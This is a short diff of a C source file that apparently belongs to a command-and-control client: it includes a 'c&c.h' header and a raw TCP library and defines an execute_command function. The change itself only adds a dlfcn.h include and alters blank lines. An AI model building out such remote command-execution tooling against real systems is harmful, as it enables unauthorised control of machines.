@@ -15,12 +15,14 @@
 #include <netdb.h>
 #include <netinet/ip.h>
 #include <netinet/tcp.h>
+#include <dlfcn.h>
 
 #include "lib/RawTCP.h"
 #include "../common/c&c.h"
 
 
 char* execute_command(char* command){
+
     FILE *fp;
     char* res = calloc(4096, sizeof(char));
     char buf[1024];
@@ -69,7 +71,6 @@ int main(int argc, char* argv[], char *envp[]){
     for(int ii=0; ii<argc; ii++){
         printf("Argument %i is %s\n", ii, argv[ii]);
     }
-
 
     time_t rawtime;
     struct tm * timeinfo;
